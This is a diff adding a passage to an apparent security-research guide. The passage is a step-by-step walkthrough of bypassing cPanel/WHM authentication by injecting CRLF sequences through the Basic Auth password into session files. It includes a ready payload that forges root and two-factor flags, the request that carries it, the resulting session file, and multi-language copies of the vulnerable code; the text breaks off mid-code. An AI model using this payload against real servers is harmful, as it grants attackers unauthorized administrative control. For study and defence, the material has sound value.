@@ -636,6 +636,2106 @@ Finally, by abusing the path error, it is possible to obtain a session for conne
 
 ***
 
+#### Bypass Authentication via CRLF Injection in Session
+
+{% stepper %}
+{% step %}
+Send a failed login request so that a session is created in the response, and capture the `cookie/session` identifier
+
+Request :
+
+```http
+POST /login/?login_only=1 HTTP/1.1
+Host: target:2087
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+
+user=root&pass=wrong
+```
+
+Response :
+
+```http
+HTTP/1.1 401 Access Denied
+Set-Cookie: whostmgrsession=%3aWg_mjzgt1hyfXefK%2c1bd3d4bf5ecbf83b660789ab0f3198fa; HttpOnly; path=/; port=2087; secure
+Content-Type: text/plain; charset="utf-8"
+Content-Length: 38
+
+{"status":0,"message":"see_login_log"}
+```
+{% endstep %}
+
+{% step %}
+Decode the session value, analyze its structure, and review the related logic in the codebase. (Check whether it includes extra parts such as secret/metadata. Note: in the code below, `ob` represents the secret key or metadata)
+{% endstep %}
+
+{% step %}
+Extract the secret value (named `ob` in this code). For example, in the response it may look like `c1bd3d4bf5ecbf83b660789ab0f3198fa` in Hex format
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+sub saveSession {
+       my ( $session, $session_ref, %options ) = @_;
+       ...
+       my $ob = get_ob_part( \$session );
+       return 0 if !is_valid_session_name($session);
+
+  -    my $encoder = $ob && Cpanel::Session::Encoder->new( 'secret' => $ob );
+  -    local $session_ref->{'pass'} = $encoder->encode_data( $session_ref->{'pass'} )
+  -      if $encoder && length $session_ref->{'pass'};
+  +    filter_sessiondata($session_ref);                            
+  +    if ( length $session_ref->{'pass'} ) {
+  +        if ( defined $ob && length $ob ) {
+  +            my $encoder = Cpanel::Session::Encoder->new( 'secret' => $ob );
+  +            $session_ref->{'pass'} = $encoder->encode_data( $session_ref->{'pass'} );
+  +        }
+  +        else {
+  +            $session_ref->{'pass'} =                                
+  +              'no-ob:' . Cpanel::Session::Encoder->hex_encode_only( $session_ref->{'pass'} );
+  +        }
+  +    }
+       ...
+   }
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+public int SaveSession(ref string session, Dictionary<string, object> session_ref, Dictionary<string, object> options)
+{
+    var ob = GetObPart(ref session);
+
+    if (!IsValidSessionName(session))
+        return 0;
+
+    FilterSessionData(session_ref);
+
+    if (session_ref.ContainsKey("pass") && session_ref["pass"] != null && session_ref["pass"].ToString().Length > 0)
+    {
+        if (ob != null && ob.Length > 0)
+        {
+            var encoder = new Cpanel.Session.Encoder(new Dictionary<string, object> { { "secret", ob } });
+            session_ref["pass"] = encoder.EncodeData(session_ref["pass"].ToString());
+        }
+        else
+        {
+            session_ref["pass"] = "no-ob:" + Cpanel.Session.Encoder.HexEncodeOnly(session_ref["pass"].ToString());
+        }
+    }
+
+    return 1;
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public int saveSession(String session, Map<String, Object> session_ref, Map<String, Object> options) {
+
+    String ob = getObPart(session);
+
+    if (!isValidSessionName(session)) {
+        return 0;
+    }
+
+    filterSessiondata(session_ref);
+
+    if (session_ref.containsKey("pass") && session_ref.get("pass") != null && session_ref.get("pass").toString().length() > 0) {
+
+        if (ob != null && ob.length() > 0) {
+            Encoder encoder = new Encoder(ob);
+            session_ref.put("pass", encoder.encodeData(session_ref.get("pass").toString()));
+        } else {
+            session_ref.put("pass", "no-ob:" + Encoder.hexEncodeOnly(session_ref.get("pass").toString()));
+        }
+    }
+
+    return 1;
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function saveSession(&$session, &$session_ref, $options = [])
+{
+    $ob = get_ob_part($session);
+
+    if (!is_valid_session_name($session)) {
+        return 0;
+    }
+
+    filter_sessiondata($session_ref);
+
+    if (!empty($session_ref['pass'])) {
+
+        if (isset($ob) && strlen($ob) > 0) {
+            $encoder = new Cpanel_Session_Encoder(['secret' => $ob]);
+            $session_ref['pass'] = $encoder->encode_data($session_ref['pass']);
+        } else {
+            $session_ref['pass'] = 'no-ob:' . Cpanel_Session_Encoder::hex_encode_only($session_ref['pass']);
+        }
+    }
+
+    return 1;
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+function saveSession(session, session_ref, options = {}) {
+
+    let ob = get_ob_part(session);
+
+    if (!is_valid_session_name(session)) {
+        return 0;
+    }
+
+    filter_sessiondata(session_ref);
+
+    if (session_ref.pass && session_ref.pass.length > 0) {
+
+        if (ob && ob.length > 0) {
+            let encoder = new Cpanel.Session.Encoder({ secret: ob });
+            session_ref.pass = encoder.encode_data(session_ref.pass);
+        } else {
+            session_ref.pass = 'no-ob:' + Cpanel.Session.Encoder.hex_encode_only(session_ref.pass);
+        }
+    }
+
+    return 1;
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Check whether, besides the session ID, a **secondary secret or token** is used to protect the data (such as encoding/encryption)
+{% endstep %}
+
+{% step %}
+Review filtering functions to see what data is removed from the session
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+sub filter_sessiondata {
+    my ($session_ref) = @_;
+    no warnings 'uninitialized';    ## no critic(ProhibitNoWarnings)
+
+    # Prevent manipulation of other entries in session file
+    tr{\r\n=\,}{}d for values %{ $session_ref->{'origin'} };
+
+    # Prevent manipulation of other entries in session file
+    tr{\r\n}{}d for @{$session_ref}{ grep { $_ ne 'origin' } keys %{$session_ref} };
+
+    # Cleanup possible directory traversal ( A valid 'pass' may have these chars )
+    tr{/}{}d for @{$session_ref}{ grep { exists $session_ref->{$_} } qw(user login_theme theme lang) };
+    return $session_ref;
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+public static Dictionary<string, object> FilterSessionData(Dictionary<string, object> session_ref)
+{
+    // Prevent manipulation of other entries in session file
+    if (session_ref.ContainsKey("origin") && session_ref["origin"] is Dictionary<string, string> originDict)
+    {
+        var keys = new List<string>(originDict.Keys);
+        foreach (var key in keys)
+        {
+            string value = originDict[key] ?? "";
+            value = value.Replace("\r", "").Replace("\n", "").Replace("=", "").Replace(",", "");
+            originDict[key] = value;
+        }
+    }
+
+    // Prevent manipulation of other entries in session file
+    foreach (var key in new List<string>(session_ref.Keys))
+    {
+        if (key != "origin" && session_ref[key] != null)
+        {
+            string value = session_ref[key].ToString();
+            value = value.Replace("\r", "").Replace("\n", "");
+            session_ref[key] = value;
+        }
+    }
+
+    // Cleanup possible directory traversal
+    string[] fields = { "user", "login_theme", "theme", "lang" };
+    foreach (var field in fields)
+    {
+        if (session_ref.ContainsKey(field) && session_ref[field] != null)
+        {
+            string value = session_ref[field].ToString();
+            value = value.Replace("/", "");
+            session_ref[field] = value;
+        }
+    }
+
+    return session_ref;
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public static Map<String, Object> filterSessiondata(Map<String, Object> session_ref) {
+
+    // Prevent manipulation of other entries in session file
+    if (session_ref.containsKey("origin") && session_ref.get("origin") instanceof Map) {
+        Map<String, String> origin = (Map<String, String>) session_ref.get("origin");
+        for (Map.Entry<String, String> entry : origin.entrySet()) {
+            String value = entry.getValue() == null ? "" : entry.getValue();
+            value = value.replaceAll("[\\r\\n=,]", "");
+            entry.setValue(value);
+        }
+    }
+
+    // Prevent manipulation of other entries in session file
+    for (String key : session_ref.keySet()) {
+        if (!key.equals("origin") && session_ref.get(key) != null) {
+            String value = session_ref.get(key).toString();
+            value = value.replaceAll("[\\r\\n]", "");
+            session_ref.put(key, value);
+        }
+    }
+
+    // Cleanup possible directory traversal
+    String[] fields = {"user", "login_theme", "theme", "lang"};
+    for (String field : fields) {
+        if (session_ref.containsKey(field) && session_ref.get(field) != null) {
+            String value = session_ref.get(field).toString();
+            value = value.replace("/", "");
+            session_ref.put(field, value);
+        }
+    }
+
+    return session_ref;
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function filter_sessiondata(&$session_ref)
+{
+    // Prevent manipulation of other entries in session file
+    if (isset($session_ref['origin']) && is_array($session_ref['origin'])) {
+        foreach ($session_ref['origin'] as $key => $value) {
+            $value = str_replace(["\r", "\n", "=", ","], "", $value ?? "");
+            $session_ref['origin'][$key] = $value;
+        }
+    }
+
+    // Prevent manipulation of other entries in session file
+    foreach ($session_ref as $key => $value) {
+        if ($key !== 'origin' && $value !== null) {
+            $session_ref[$key] = str_replace(["\r", "\n"], "", $value);
+        }
+    }
+
+    // Cleanup possible directory traversal
+    $fields = ['user', 'login_theme', 'theme', 'lang'];
+    foreach ($fields as $field) {
+        if (isset($session_ref[$field])) {
+            $session_ref[$field] = str_replace("/", "", $session_ref[$field]);
+        }
+    }
+
+    return $session_ref;
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+function filter_sessiondata(session_ref) {
+
+    // Prevent manipulation of other entries in session file
+    if (session_ref.origin && typeof session_ref.origin === "object") {
+        for (let key in session_ref.origin) {
+            let value = session_ref.origin[key] || "";
+            value = value.replace(/[\r\n=,]/g, "");
+            session_ref.origin[key] = value;
+        }
+    }
+
+    // Prevent manipulation of other entries in session file
+    for (let key in session_ref) {
+        if (key !== "origin" && session_ref[key] != null) {
+            let value = session_ref[key].toString();
+            value = value.replace(/[\r\n]/g, "");
+            session_ref[key] = value;
+        }
+    }
+
+    // Cleanup possible directory traversal
+    let fields = ["user", "login_theme", "theme", "lang"];
+    for (let field of fields) {
+        if (session_ref[field]) {
+            session_ref[field] = session_ref[field].replace(/\//g, "");
+        }
+    }
+
+    return session_ref;
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Find the session storage path on the server and analyze the structure of the session file/data
+{% endstep %}
+
+{% step %}
+Check what data is stored in the session before authentication (initial system state)
+
+```bash
+$ cat /var/cpanel/sessions/raw/:Wg_mjzgt1hyfXefK
+
+local_ip_address=172.17.0.2
+external_validation_token=bOOwkwVzFsruooU0
+cp_security_token=/cpsess7833455106
+needs_auth=1
+origin_as_string=address=172.17.0.1,app=whostmgrd,method=badpass
+hulk_registered=0
+tfa_verified=0
+ip_address=172.17.0.1
+local_port=2087
+port=49254
+login_theme=cpanel
+```
+{% endstep %}
+
+{% step %}
+Then check whether additional data is stored in the session file after authentication (for example user, pass)
+{% endstep %}
+
+{% step %}
+Check under what conditions security mechanisms are enabled or disabled (for example based on a specific secret or NULL value), and design a scenario to disable the protection
+{% endstep %}
+
+{% step %}
+If security mechanisms are disabled, check whether sensitive data is stored in raw form (such as passwords). If so, the session-saving function becomes a dangerous sink. Then review the entire codebase to find where this function is called
+{% endstep %}
+
+{% step %}
+In the code, find headers such as **Authentication Header** (for example `Authorization: Basic`) and review how they are processed. Check whether inputs like username and password are validated or filtered, and whether the dangerous sink (`saveSession`) is used
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+my $auth_header = $server_obj->request->get_headers->{'authorization'};
+if (not $auth_header) {
+    $server_obj->badpass('preserve_token', 1, 'noauth', 1);
+}
+else {
+    my ($authtype, $encoded) = split(/\s+/, $auth_header, 2);
+    if ($authtype =~ /^basic$/i) {
+        my ($user, $pass) = split(/:/, decode_base64($encoded), 2);
+        ...
+        $user = $server_obj->auth->set_user($user);   # حذف \0 و /
+        $pass = $server_obj->auth->set_pass($pass);   # فقط حذف \0
+        ...
+
+        if (defined $SESSION_ref) {
+            my $safe_login = $SESSION_ref->{'needs_auth'} ? 1 : 0;
+            if (defined $SESSION_ref->{'user'}
+                and defined $SESSION_ref->{'pass'}
+                and $SESSION_ref->{'user'} eq $user
+                and $SESSION_ref->{'pass'} eq $pass)
+            {
+                $safe_login = 1;
+            }
+            else {
+                $SESSION_ref->{'needs_auth'} = 1;
+            }
+            ...
+            if ($SESSION_ref->{'needs_auth'}) {
+                delete $SESSION_ref->{'needs_auth'};
+                $SESSION_ref->{'user'} = $user;
+                $SESSION_ref->{'pass'} = $pass;       # (1) مقدار pass کنترل‌شده توسط attacker
+                unless (Cpanel::Session::saveSession($session, $SESSION_ref)) { // (2)
+                    $server_obj->badpass(...);
+                }
+            }
+            ...
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+var auth_header = server_obj.request.get_headers()["authorization"];
+
+if (auth_header == null)
+{
+    server_obj.badpass("preserve_token", 1, "noauth", 1);
+}
+else
+{
+    var parts = auth_header.Split(new[] { ' ' }, 2);
+    var authtype = parts[0];
+    var encoded = parts.Length > 1 ? parts[1] : null;
+
+    if (System.Text.RegularExpressions.Regex.IsMatch(authtype, "^basic$", System.Text.RegularExpressions.RegexOptions.IgnoreCase))
+    {
+        var decoded = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
+        var creds = decoded.Split(new[] { ':' }, 2);
+
+        var user = creds[0];
+        var pass = creds.Length > 1 ? creds[1] : null;
+
+        user = server_obj.auth.set_user(user);
+        pass = server_obj.auth.set_pass(pass);
+
+        if (SESSION_ref != null)
+        {
+            int safe_login = SESSION_ref.ContainsKey("needs_auth") ? 1 : 0;
+
+            if (SESSION_ref.ContainsKey("user")
+                && SESSION_ref.ContainsKey("pass")
+                && SESSION_ref["user"].ToString() == user
+                && SESSION_ref["pass"].ToString() == pass)
+            {
+                safe_login = 1;
+            }
+            else
+            {
+                SESSION_ref["needs_auth"] = 1;
+            }
+
+            if (SESSION_ref.ContainsKey("needs_auth"))
+            {
+                SESSION_ref.Remove("needs_auth");
+                SESSION_ref["user"] = user;
+                SESSION_ref["pass"] = pass;
+
+                if (!Cpanel.Session.saveSession(session, SESSION_ref))
+                {
+                    server_obj.badpass();
+                }
+            }
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+String auth_header = server_obj.getRequest().getHeaders().get("authorization");
+
+if (auth_header == null) {
+    server_obj.badpass("preserve_token", 1, "noauth", 1);
+} else {
+
+    String[] parts = auth_header.split("\\s+", 2);
+    String authtype = parts[0];
+    String encoded = parts.length > 1 ? parts[1] : null;
+
+    if (authtype.equalsIgnoreCase("basic")) {
+
+        String decoded = new String(Base64.getDecoder().decode(encoded));
+        String[] creds = decoded.split(":", 2);
+
+        String user = creds[0];
+        String pass = creds.length > 1 ? creds[1] : null;
+
+        user = server_obj.getAuth().setUser(user);
+        pass = server_obj.getAuth().setPass(pass);
+
+        if (SESSION_ref != null) {
+
+            int safe_login = SESSION_ref.containsKey("needs_auth") ? 1 : 0;
+
+            if (SESSION_ref.containsKey("user")
+                    && SESSION_ref.containsKey("pass")
+                    && SESSION_ref.get("user").equals(user)
+                    && SESSION_ref.get("pass").equals(pass)) {
+
+                safe_login = 1;
+            } else {
+                SESSION_ref.put("needs_auth", 1);
+            }
+
+            if (SESSION_ref.containsKey("needs_auth")) {
+                SESSION_ref.remove("needs_auth");
+                SESSION_ref.put("user", user);
+                SESSION_ref.put("pass", pass);
+
+                if (!Cpanel.Session.saveSession(session, SESSION_ref)) {
+                    server_obj.badpass();
+                }
+            }
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+$auth_header = $server_obj->request->get_headers()['authorization'] ?? null;
+
+if (!$auth_header) {
+    $server_obj->badpass('preserve_token', 1, 'noauth', 1);
+} else {
+
+    $parts = preg_split('/\s+/', $auth_header, 2);
+    $authtype = $parts[0];
+    $encoded = $parts[1] ?? null;
+
+    if (preg_match('/^basic$/i', $authtype)) {
+
+        $decoded = base64_decode($encoded);
+        $creds = explode(':', $decoded, 2);
+
+        $user = $creds[0];
+        $pass = $creds[1] ?? null;
+
+        $user = $server_obj->auth->set_user($user);
+        $pass = $server_obj->auth->set_pass($pass);
+
+        if (isset($SESSION_ref)) {
+
+            $safe_login = isset($SESSION_ref['needs_auth']) ? 1 : 0;
+
+            if (isset($SESSION_ref['user'])
+                && isset($SESSION_ref['pass'])
+                && $SESSION_ref['user'] === $user
+                && $SESSION_ref['pass'] === $pass) {
+
+                $safe_login = 1;
+            } else {
+                $SESSION_ref['needs_auth'] = 1;
+            }
+
+            if (isset($SESSION_ref['needs_auth'])) {
+                unset($SESSION_ref['needs_auth']);
+                $SESSION_ref['user'] = $user;
+                $SESSION_ref['pass'] = $pass;
+
+                if (!Cpanel_Session::saveSession($session, $SESSION_ref)) {
+                    $server_obj->badpass();
+                }
+            }
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+let auth_header = server_obj.request.get_headers()["authorization"];
+
+if (!auth_header) {
+    server_obj.badpass("preserve_token", 1, "noauth", 1);
+} else {
+
+    let parts = auth_header.split(/\s+/, 2);
+    let authtype = parts[0];
+    let encoded = parts[1];
+
+    if (/^basic$/i.test(authtype)) {
+
+        let decoded = Buffer.from(encoded, 'base64').toString();
+        let creds = decoded.split(":", 2);
+
+        let user = creds[0];
+        let pass = creds[1];
+
+        user = server_obj.auth.set_user(user);
+        pass = server_obj.auth.set_pass(pass);
+
+        if (SESSION_ref) {
+
+            let safe_login = SESSION_ref.needs_auth ? 1 : 0;
+
+            if (SESSION_ref.user !== undefined
+                && SESSION_ref.pass !== undefined
+                && SESSION_ref.user === user
+                && SESSION_ref.pass === pass) {
+
+                safe_login = 1;
+            } else {
+                SESSION_ref.needs_auth = 1;
+            }
+
+            if (SESSION_ref.needs_auth) {
+                delete SESSION_ref.needs_auth;
+                SESSION_ref.user = user;
+                SESSION_ref.pass = pass;
+
+                if (!Cpanel.Session.saveSession(session, SESSION_ref)) {
+                    server_obj.badpass();
+                }
+            }
+        }
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Create a credential for Basic Auth
+
+```
+root:<payload>
+```
+
+Prepare the payload accordingly :
+
+```bash
+x\r\n
+hasroot=1\r\n
+tfa_verified=1\r\n
+user=root\r\n
+cp_security_token=/cpsess9999999999\r\n
+successful_internal_auth_with_timestamp=1777462149
+```
+{% endstep %}
+
+{% step %}
+Encode the payload in Base64 and place it in the authentication header, then send the request. Check whether the response returns status code 302 or 307. If yes, authentication was successful
+
+```http
+GET / HTTP/1.1
+Host: target:2087
+Cookie: whostmgrsession=%3aQSJN_sFdKZtCi2o_
+Authorization: Basic cm9vdDp4DQpoYXNyb290PTENCnRmYV92ZXJpZmllZD0xDQp1c2VyPXJvb3QNCmNwX3Nl…
+Connection: close
+```
+{% endstep %}
+
+{% step %}
+Read the session file stored on disk and check whether the credentials created by your payload are present
+
+```bash
+$ cat -A /var/cpanel/sessions/raw/:QSJN_sFdKZtCi2o_
+
+tfa_verified=0$
+ip_address=172.17.0.1$
+user=root$
+login_theme=cpanel$
+port=43586$
+origin_as_string=address=172.17.0.1,app=whostmgrd,method=badpass$
+pass=x
+hasroot=1
+tfa_verified=1
+user=root
+cp_security_token=/cpsess9999999999
+successful_internal_auth_with_timestamp=1777462149
+hulk_registered=0$
+local_port=2087$
+cp_security_token=/cpsess0228251236$
+external_validation_token=ss27XQjbY11gmCDs$
+local_ip_address=172.17.0.2$
+```
+{% endstep %}
+
+{% step %}
+Send a request to internal APIs and observe the response. If you receive 200, authentication is successful. If you receive 403, check which function processes authenticated requests (for example page loads or API calls). Also check whether it reads the raw session file or a cached version
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+sub loadSession {
+    my ($session) = @_;
+    ...
+    my $session_file  = get_session_file_path($session); # /var/cpanel/sessions/raw/<id>
+    my $session_cache = $Cpanel::Config::Session::SESSION_DIR . '/cache/' . $session;
+    my $session_ref;
+
+    # First try the binary cache. AdminBin::Serializer is JSON.
+    if ( $session_cache_fh = _open_if_exists_or_warn($session_cache) ) {
+        eval {
+            local $SIG{__DIE__};
+            $session_ref = Cpanel::AdminBin::Serializer::LoadFile($session_cache_fh);
+            $mtime       = ( stat($session_cache_fh) )[9];
+        };
+    }
+
+    # Only fall through to the slow text parse if the cache load failed or returned nothing.
+    if ( !keys %$session_ref ) {
+        if ( $session_fh = _open_if_exists_or_warn($session_file) ) {
+            require Cpanel::Config::LoadConfig;
+            $session_ref = Cpanel::Config::LoadConfig::parse_from_filehandle(
+                $session_fh, delimiter => '='
+            );
+        }
+    }
+    ...
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+public Dictionary<string, object> LoadSession(string session)
+{
+    string session_file = GetSessionFilePath(session); // /var/cpanel/sessions/raw/<id>
+    string session_cache = Cpanel.Config.Session.SESSION_DIR + "/cache/" + session;
+    Dictionary<string, object> session_ref = null;
+
+    FileStream session_cache_fh = null;
+
+    // First try the binary cache. AdminBin::Serializer is JSON.
+    if ((session_cache_fh = OpenIfExistsOrWarn(session_cache)) != null)
+    {
+        try
+        {
+            session_ref = Cpanel.AdminBin.Serializer.LoadFile(session_cache_fh);
+            long mtime = session_cache_fh.LastWriteTimeUtc.Ticks;
+        }
+        catch
+        {
+            // ignore
+        }
+    }
+
+    // Only fall through to the slow text parse if the cache load failed or returned nothing.
+    if (session_ref == null || session_ref.Count == 0)
+    {
+        FileStream session_fh = OpenIfExistsOrWarn(session_file);
+
+        if (session_fh != null)
+        {
+            session_ref = Cpanel.Config.LoadConfig.ParseFromFileHandle(
+                session_fh,
+                "="
+            );
+        }
+    }
+
+    return session_ref;
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public Map<String, Object> loadSession(String session) {
+
+    String session_file = getSessionFilePath(session); // /var/cpanel/sessions/raw/<id>
+    String session_cache = Cpanel.Config.Session.SESSION_DIR + "/cache/" + session;
+    Map<String, Object> session_ref = null;
+
+    FileInputStream session_cache_fh = null;
+
+    // First try the binary cache. AdminBin::Serializer is JSON.
+    if ((session_cache_fh = openIfExistsOrWarn(session_cache)) != null) {
+        try {
+            session_ref = Cpanel.AdminBin.Serializer.loadFile(session_cache_fh);
+            long mtime = session_cache_fh.getChannel().lastModifiedTime().toMillis();
+        } catch (Exception e) {
+            // ignore
+        }
+    }
+
+    // Only fall through to the slow text parse if the cache load failed or returned nothing.
+    if (session_ref == null || session_ref.isEmpty()) {
+
+        FileInputStream session_fh = openIfExistsOrWarn(session_file);
+
+        if (session_fh != null) {
+            session_ref = Cpanel.Config.LoadConfig.parseFromFileHandle(
+                session_fh,
+                "="
+            );
+        }
+    }
+
+    return session_ref;
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function loadSession($session)
+{
+    $session_file  = get_session_file_path($session); // /var/cpanel/sessions/raw/<id>
+    $session_cache = Cpanel\Config\Session::SESSION_DIR . '/cache/' . $session;
+    $session_ref = null;
+
+    $session_cache_fh = null;
+
+    // First try the binary cache. AdminBin::Serializer is JSON.
+    if (($session_cache_fh = _open_if_exists_or_warn($session_cache))) {
+        try {
+            $session_ref = Cpanel_AdminBin_Serializer::LoadFile($session_cache_fh);
+            $mtime = filemtime($session_cache);
+        } catch (Exception $e) {
+            // ignore
+        }
+    }
+
+    // Only fall through to the slow text parse if the cache load failed or returned nothing.
+    if (empty($session_ref)) {
+
+        $session_fh = _open_if_exists_or_warn($session_file);
+
+        if ($session_fh) {
+            $session_ref = Cpanel_Config_LoadConfig::parse_from_filehandle(
+                $session_fh,
+                '='
+            );
+        }
+    }
+
+    return $session_ref;
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+function loadSession(session) {
+
+    let session_file = get_session_file_path(session); // /var/cpanel/sessions/raw/<id>
+    let session_cache = Cpanel.Config.Session.SESSION_DIR + "/cache/" + session;
+    let session_ref = null;
+
+    let fs = require("fs");
+
+    let session_cache_fh = null;
+
+    // First try the binary cache. AdminBin::Serializer is JSON.
+    if ((session_cache_fh = openIfExistsOrWarn(session_cache)) != null) {
+        try {
+            session_ref = Cpanel.AdminBin.Serializer.loadFile(session_cache_fh);
+            let mtime = fs.statSync(session_cache).mtimeMs;
+        } catch (e) {
+            // ignore
+        }
+    }
+
+    // Only fall through to the slow text parse if the cache load failed or returned nothing.
+    if (!session_ref || Object.keys(session_ref).length === 0) {
+
+        let session_fh = openIfExistsOrWarn(session_file);
+
+        if (session_fh) {
+            session_ref = Cpanel.Config.LoadConfig.parseFromFileHandle(
+                session_fh,
+                "="
+            );
+        }
+    }
+
+    return session_ref;
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Analyze the structure of the generated cache file and its format (for example JSON)
+
+```json
+{
+"tfa_verified":"0",
+"ip_address":"172.17.0.1",
+"user":"root",
+"pass":"x\r\nhasroot=1\r\ntfa_verified=1\r\nuser=root\r\n...",
+"cp_security_token":"/cpsess0228251236"
+}    
+```
+{% endstep %}
+
+{% step %}
+In the codebase, find paths where the session is reprocessed from raw data and rewritten into the cache file (JSON or other format). These methods are usually part of session processing logic
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+if ( !keys %$session_ref ) {
+    $session_ref = Cpanel::Config::LoadConfig::parse_from_filehandle(...)
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+if (session_ref == null || session_ref.Count == 0)
+{
+    session_ref = Cpanel.Config.LoadConfig.ParseFromFileHandle(...);
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+if (session_ref == null || session_ref.isEmpty()) {
+    session_ref = Cpanel.Config.LoadConfig.parseFromFileHandle(...);
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+if (empty($session_ref) || !count($session_ref)) {
+    $session_ref = Cpanel_Config_LoadConfig::parse_from_filehandle(...);
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+if (!session_ref || Object.keys(session_ref).length === 0) {
+    session_ref = Cpanel.Config.LoadConfig.parseFromFileHandle(...);
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Find where the function responsible for parsing files (such as `parse_from_filehandle`) is called. Go to its definition and check whether it can ignore the cache file (JSON format)
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+sub new {
+    my ( $class, $session, $check_expiration ) = @_;
+
+    if ( $check_expiration ? !Cpanel::Session::Load::session_exists_and_is_current($session) : !Cpanel::Session::Load::session_exists($session) ) {
+        die "The session  ^`^|$session ^`^} does not exist";
+    }
+
+    Cpanel::Session::Load::get_ob_part( \$session );    # strip ob_part
+
+    my $session_file = Cpanel::Session::Load::get_session_file_path($session);
+
+    # Cpanel::Transaction not available here due to memory constraints
+    my ( $ref, $fh, $conflock ) = Cpanel::Config::LoadConfig::loadConfig( // (1)
+        $session_file,
+        undef,
+        '=',
+        undef,
+        0,
+        0,
+        { 'skip_readable_check' => 1, 'nocache' => 1, 'keep_locked_open' => 1, 'rw' => 1 } // (2)
+    );
+
+    return bless {
+        '_session' => $session,
+        '_fh'      => $fh,
+        '_lock'    => $conflock,
+        '_data'    => Cpanel::Session::decode_origin($ref),
+    }, $class;
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+public class SessionLoader
+{
+    public static SessionLoader New(string session, bool check_expiration)
+    {
+        if (check_expiration
+            ? !Cpanel.Session.Load.SessionExistsAndIsCurrent(session)
+            : !Cpanel.Session.Load.SessionExists(session))
+        {
+            throw new Exception("The session ^`^|" + session + " ^`^} does not exist");
+        }
+
+        Cpanel.Session.Load.GetObPart(ref session); // strip ob_part
+
+        string session_file = Cpanel.Session.Load.GetSessionFilePath(session);
+
+        // Cpanel::Transaction not available here due to memory constraints
+        var result = Cpanel.Config.LoadConfig.LoadConfig(
+            session_file,
+            null,
+            "=",
+            null,
+            0,
+            0,
+            new Dictionary<string, object>
+            {
+                { "skip_readable_check", 1 },
+                { "nocache", 1 },
+                { "keep_locked_open", 1 },
+                { "rw", 1 }
+            }
+        );
+
+        var refData = result.Item1;
+        var fh = result.Item2;
+        var conflock = result.Item3;
+
+        return new SessionLoader
+        {
+            _session = session,
+            _fh = fh,
+            _lock = conflock,
+            _data = Cpanel.Session.DecodeOrigin(refData)
+        };
+    }
+
+    private string _session;
+    private object _fh;
+    private object _lock;
+    private object _data;
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public class SessionLoader {
+
+    public static SessionLoader newInstance(String session, boolean check_expiration) throws Exception {
+
+        if (check_expiration
+                ? !Cpanel.Session.Load.sessionExistsAndIsCurrent(session)
+                : !Cpanel.Session.Load.sessionExists(session)) {
+
+            throw new Exception("The session ^`^|" + session + " ^`^} does not exist");
+        }
+
+        Cpanel.Session.Load.getObPart(session); // strip ob_part
+
+        String session_file = Cpanel.Session.Load.getSessionFilePath(session);
+
+        // Cpanel::Transaction not available here due to memory constraints
+        LoadConfigResult result = Cpanel.Config.LoadConfig.loadConfig(
+                session_file,
+                null,
+                "=",
+                null,
+                0,
+                0,
+                new HashMap<String, Object>() {{
+                    put("skip_readable_check", 1);
+                    put("nocache", 1);
+                    put("keep_locked_open", 1);
+                    put("rw", 1);
+                }}
+        );
+
+        Map<String, Object> refData = result.getRef();
+        FileInputStream fh = result.getFh();
+        Object conflock = result.getLock();
+
+        return new SessionLoader(
+                session,
+                fh,
+                conflock,
+                Cpanel.Session.decodeOrigin(refData)
+        );
+    }
+
+    private String session;
+    private Object fh;
+    private Object lock;
+    private Object data;
+
+    public SessionLoader(String session, Object fh, Object lock, Object data) {
+        this.session = session;
+        this.fh = fh;
+        this.lock = lock;
+        this.data = data;
+    }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+class SessionLoader {
+
+    public static function new($class, $session, $check_expiration)
+    {
+        if ($check_expiration
+            ? !Cpanel_Session_Load::session_exists_and_is_current($session)
+            : !Cpanel_Session_Load::session_exists($session)) {
+
+            die("The session  ^`^|$session ^`^} does not exist");
+        }
+
+        Cpanel_Session_Load::get_ob_part($session);
+
+        $session_file = Cpanel_Session_Load::get_session_file_path($session);
+
+        // Cpanel::Transaction not available here due to memory constraints
+        list($ref, $fh, $conflock) = Cpanel_Config_LoadConfig::loadConfig(
+            $session_file,
+            null,
+            '=',
+            null,
+            0,
+            0,
+            [
+                'skip_readable_check' => 1,
